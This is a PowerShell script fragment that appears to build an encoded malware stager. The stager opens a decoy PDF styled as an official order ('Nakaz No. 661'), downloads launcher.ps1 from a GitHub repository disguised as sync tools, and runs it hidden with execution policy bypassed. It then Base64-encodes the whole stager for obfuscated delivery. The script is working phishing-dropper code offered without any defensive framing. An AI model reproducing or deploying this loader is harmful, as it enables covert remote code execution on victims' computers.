$cache="$env:APPDATA\Microsoft\Windows\Caches"
if(!(Test-Path $cache)){mkdir $cache -Force|Out-Null}
$pdfUrl='https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/Nakaz_No._661_vid_02.03.2026-4.pdf'
$pdfPath="$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
if(!(Test-Path $pdfPath)){(New-Object Net.WebClient).DownloadFile($pdfUrl,$pdfPath)}
Start-Process $pdfPath
$launcherUrl='https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1'
$launcherPath="$cache\launcher.ps1"
(New-Object Net.WebClient).DownloadFile($launcherUrl,$launcherPath)
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($bootContent)
$encodedCommand = [Convert]::ToBase64String($bytes)
Write-Output $encodedCommand
